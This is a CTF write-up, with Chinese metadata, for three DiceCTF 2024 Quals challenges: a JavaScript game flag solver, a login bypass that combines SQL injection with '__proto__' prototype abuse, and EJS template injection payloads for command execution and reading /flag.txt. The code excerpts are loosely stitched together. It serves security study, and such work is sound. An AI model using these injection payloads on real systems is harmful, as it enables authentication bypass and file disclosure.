---
title: DiceCTF 2024 Quals Writeups
contest: DiceCTF 2024 Quals
year: 2024
difficulty: medium
vuln_type: web_unknown
tags:
- web
- js
- prototype-pollution
- ejs-ssti
- base64
- sql-injection
- auth-bypass
- duck
attack_chain:
- 'Dice Dice Goose: history.push([player, goose])×8步编码base64'
- score==9 → flag
- '历史解: player[0]++ / goose[1]--'
- 'funnylogin: SQL注入 + isAdmin[__proto__] 原型链污染'
- 'SQL: '' union select ''1 拿 id=1'
- 污染 __proto__ 让 isAdmin 检查通过
- 'EJS SSTI: <%- include(''/flag.txt'') %>'
- <%- global.process.mainModule.require('child_process').execSync('ls -la') %>
key_payload: user=__proto__&pass='%20union%20select%20'1
one_liner: DiceCTF 2024：JS鸭子游戏+SQL注入+原型链污染+EJS SSTI
lesson: SQL注入+'__proto__'污染isAdmin对象可绕过认证
quality: high
full_path: DiceCTF_2024_Quals_Writeups.full.md
meta_path: DiceCTF_2024_Quals_Writeups.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'DiceCTF 2024 Quals Writeups。DiceCTF 2024：JS鸭子游戏+SQL注入+原型链污染+EJS SSTI。关键路径：Dice Dice Goose: history.push([player, goose])×8步编码base64 → score==9 → flag → 历史解: player[0]++ / goose[1]--。经验：SQL注入+''__pro...'
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/160792.html
reasoning_chain:
- Dice Dice Goose JS 游戏 → 触发点：8 步 history 编码 base64 = flag
- 动作：player=[0,1] → player[0]++ 8 次；goose=[9,9] → goose[1]-- 8 次 → encode(history) 拼接
- score==9 触发 flag = dice{pr0_duck_gam3r_<encode>}
- funnylogin 题：SQL 注入 + 原型链污染 → 观察：db.prepare `SELECT id FROM users WHERE username='${user}' AND password='${pass}'`
- 假设：user='__proto__' 触发 isAdmin 原型链 → 动作：user=__proto__&pass=' union select '1
- '观察：污染 isAdmin.__proto__ = {isAdmin: true} → 条件 users[id] && isAdmin[user] 通过'
- EJS SSTI 题：<%- include('/flag.txt') %> → 假设：模板 include 任意文件 → 观察：flag 直接渲染
- 动作：global.process.mainModule.require('child_process').execSync('ls -la') → 失败（ejs:5 new context）→ 用 include 绕过
failed_attempts:
- 试图用 execSync RCE → 失败：EJS 5.x mainModule 在新 context 不可访问
- 试图 SQL 注入直接返回 admin flag → 失败：必须同时绕 isAdmin
key_observations:
- SQL 注入 + '__proto__' 污染 isAdmin 对象可绕过认证
- EJS <%- include('/flag.txt') %> 是文件读取 SSTI 模板
- structuredClone 复制对象数组是 history 编码关键
- JS 原型链污染是 auth bypass 经典手法
prerequisites:
- JS 原型链污染（__proto__）
- SQL 注入（union select）
- EJS 模板引擎 SSTI
- better-sqlite3 prepare 语法
---
# DiceCTF 2024 Quals Writeups

> 原文: https://www.ctfiot.com/160792.html
> ID: 160792


```
function win(history) {
 const code = encode(history) + ";" + prompt("Name?");

 const saveURL = location.origin + "?code=" + code;
 displaywrapper.classList.remove("hidden");

 const score = history.length;

 display.children[1].innerHTML = "Your score was: " + score + "";
 display.children[2].href =
 "https://twitter.com/intent/tweet?text=" +
 encodeURIComponent(
 "Can you beat my score of " + score + " in Dice Dice Goose?",
 ) +
 "&url=" +
 encodeURIComponent(saveURL);

 if (score === 9) log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
 }
let player = [0, 1];
 let goose = [9, 9];
function encode(history) {
 const data = new Uint8Array(history.length * 4);

 let idx = 0;
 for (const part of history) {
 data[idx++] = part[0][0];
 data[idx++] = part[0][1];
 data[idx++] = part[1][0];
 data[idx++] = part[1][1];
 }

 let prev = String.fromCharCode.apply(null, data);
 let ret = btoa(prev);
 return ret;
 }

let player = [0, 1];
let goose = [9, 9];

let history = [];
history.push([structuredClone(player), structuredClone(goose)]);

for (let i = 0; i < 8; i++) {
 player[0]++;
 goose[1]--;
 history.push([structuredClone(player), structuredClone(goose)]);
}

console.log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;
app.post("/api/login", (req, res) => {
 const { user, pass } = req.body;

 const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
 try {
 const id = db.prepare(query).get()?.id;
 if (!id) {
 return res.redirect("/?message=Incorrect username or password");
 }

 if (users[id] && isAdmin[user]) {
 return res.redirect("/?flag=" + encodeURIComponent(FLAG));
 }
 return res.redirect("/?message=This system is currently only available to admins...");
 }
 catch {
 return res.redirect("/?message=Nice try...");
 }
});
> const isAdmin = {};
undefined
> isAdmin['__proto__']
[Object: null prototype] {}
POST /api/login HTTP/2
Host: funnylogin.mc.ax
Content-Length: 43
Content-Type: application/x-www-form-urlencoded

user=__proto__&pass='%20union%20select%20'1
print R

please ignore the followings

<%- global.process.mainModule.require('child_process').execSync('ls -la') %>
TypeError: ejs:5
 3| please ignore the followings
 4|
 >> 5| <%- global.process.mainModule.require('child_process').execSync('ls -la') %>

Cannot read properties of undefined (reading 'require')
print R

please ignore the followings

<%- include('/flag.txt') %>
```
